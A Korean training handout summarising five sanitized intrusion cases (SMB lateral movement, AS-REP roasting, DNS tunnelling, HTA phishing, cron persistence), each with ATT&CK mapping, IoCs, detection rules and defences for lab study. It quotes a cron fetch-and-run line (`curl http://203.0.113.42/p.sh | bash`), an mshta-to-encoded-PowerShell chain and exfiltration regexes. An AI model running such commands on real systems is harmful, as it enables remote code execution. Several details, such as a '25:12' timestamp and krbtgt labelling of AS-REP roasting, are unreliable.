# Real-world Cases — battle-adv-nonai

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

이 코스의 lab 들이 다루는 위협 카테고리에서 가장 자주 일어나는 *실제* incident 5 건. 각 lab 시작 전 해당 사례를 읽고 어떤 패턴을 *재현·탐지·대응* 할지 가늠하세요.

---

## SMB 측면이동 — 동일 자격증명 5호스트

> **출처**: WitFoo Precinct 6 / `incident-2024-08-001` (anchor: `anc-eca1db9a5a31`) · sanitized
> **시점**: 2024-08-12 03:14 ~ 03:42 (28 분)

**관찰**: 10.20.30.50 (john.doe) → 10.20.30.{60,70,80,90,100} 에 SMB 인증 성공. 단일 자격증명 재사용 패턴.

**MITRE ATT&CK**: **T1021.002 (SMB/Windows Admin Shares)**, **T1078 (Valid Accounts)**

**IoC**:
  - `10.20.30.50`
  - `smb-share://win-fs01/admin$`

**학습 포인트**:
- 동일 계정의 *시간상 가까운* 다중 호스트 SMB 인증 = 측면이동 강한 신호
- 패스워드 재사용 / 서비스 계정 공유 / SSO 토큰 위조 가능성
- 탐지: Sysmon EID 4624 (logon type 3) + 시간 윈도우 5분 + 호스트 N≥3
- 방어: per-host local admin / network segmentation / Windows Defender Credential Guard


## Kerberos AS-REP roasting — krbtgt 외부 유출

> **출처**: WitFoo Precinct 6 / `incident-2024-08-002` (anchor: `anc-7c9fb0248f47`) · sanitized
> **시점**: 2024-08-15 11:02 ~ 11:18 (16 분)

**관찰**: win-dc01 의 PreAuthFlag=False 계정 3건 식별 + AS-REP 응답이 외부 IP 198.51.100.42 로 유출.

**MITRE ATT&CK**: **T1558.004 (AS-REP Roasting)**

**IoC**:
  - `198.51.100.42`
  - `krbtgt-hash:abc123def`

**학습 포인트**:
- PreAuthentication 비활성화 계정이 곧 공격 표면 (서비스/legacy/오설정)
- Hash 추출 → hashcat 으로 오프라인 brute force → Domain Admin 가능성
- 탐지: DC 의 EID 4768 + AS-REP 패킷 길이 / 외부 destination IP
- 방어: 모든 계정 PreAuth 활성, krbtgt 분기별 회전, FIDO2 도입


## DNS 터널링 — base32 페이로드

> **출처**: WitFoo Precinct 6 / `incident-2024-08-003` (anchor: `anc-3564198ef1bc`) · sanitized
> **시점**: 2024-08-22 22:47 ~ 25:12 (2시간 25분, 1,247 쿼리)

**관찰**: 10.20.30.80 → ns.evil.example 으로 비정상 길이 DNS 쿼리. subdomain 패턴이 base32 인코딩 ([a-z2-7]{40,60}).

**MITRE ATT&CK**: **T1071.004 (DNS C2)**, **T1048.003 (Exfiltration over Unencrypted Non-C2 Protocol)**

**IoC**:
  - `ns.evil.example`
  - `[a-z2-7]{40,60}\.evil\.example`

**학습 포인트**:
- 정상 DNS subdomain 평균 8~15자, 비정상 40~60자 base32 = 강한 신호
- 평균 8.5건/분 안정 송출 — burst 없는 *조용한 누출* 패턴
- 탐지: Suricata `dsize > 50` + base32 정규식, 또는 entropy 기반 분석
- 방어: outbound DNS 화이트리스트, DNS-over-HTTPS 조직 정책, NXDOMAIN 비율 모니터링


## 스피어 피싱 첨부파일 — HTA + PowerShell downloader

> **출처**: WitFoo Precinct 6 / `incident-2024-08-004` (anchor: `anc-cbdabf2e6c87`) · sanitized
> **시점**: 2024-08-18 (Initial Access)

**관찰**: user@victim.example 이 invoice.hta 첨부 실행 → mshta.exe → cmd → powershell -enc <base64 payload>.

**MITRE ATT&CK**: **T1566.001 (Spearphishing Attachment)**, **T1059.001 (PowerShell)**, **T1218.005 (Mshta)**

**IoC**:
  - `invoice.hta`
  - `mshta.exe → cmd → powershell -enc`

**학습 포인트**:
- HTA 가 IE/MSHTA 통해 신뢰 zone 으로 실행 — 클라이언트 측 첫 발판
- AppLocker 또는 Windows Defender ASR 룰로 mshta.exe child process 차단 가능
- 탐지: Sysmon EID 1 (process create), parent=mshta.exe child=cmd/powershell
- 방어: 이메일 게이트웨이 첨부 sandboxing, .hta 차단, ASR 룰, EDR 프로세스 트리


## Linux cron + curl downloader — fileless persistence

> **출처**: WitFoo Precinct 6 / `incident-2024-08-005` (anchor: `anc-bf23b0106fe4`) · sanitized
> **시점**: 2024-08-25 ~ (지속, 5분 주기)

**관찰**: 10.20.30.80 의 /etc/cron.d/ 에 신규 항목 — 5분마다 `curl http://203.0.113.42/p.sh | bash` 실행.

**MITRE ATT&CK**: **T1053.003 (Scheduled Task: Cron)**, **T1105 (Ingress Tool Transfer)**

**IoC**:
  - `203.0.113.42`
  - `/etc/cron.d/<신규>`
  - `curl ... | bash`

**학습 포인트**:
- cron entry 자체만 디스크 흔적, 실제 페이로드는 *메모리에만* (fileless)
- 5분 주기 외부 outbound → SIEM 의 baseline 비교 시 강한 신호
- 탐지: auditd EXECVE (curl + http://* + bash 파이프), Wazuh syscheck (cron.d 파일 변경)
- 방어: outbound HTTP 화이트리스트, cron.d FIM, AppArmor curl 제한, EDR 메모리 스캔


---

## 학습 활용

1. **Red 입장 재현**: 위 IoC + MITRE technique 을 자기 환경 (실습 인프라) 에서 시뮬레이션.
2. **Blue 입장 탐지**: 학습 포인트의 탐지 룰을 자기 SIEM/IDS 에 적용 → false positive 측정.
3. **자기 인프라 검색**: 위 사례의 IoC 를 자기 access.log / DNS log / cron.d 에서 grep — 0건이라야 정상.

각 lab 의 verify.semantic 의 success_criteria 가 위 패턴과 직접 매칭되도록 작성됨 (semantic_first_judge).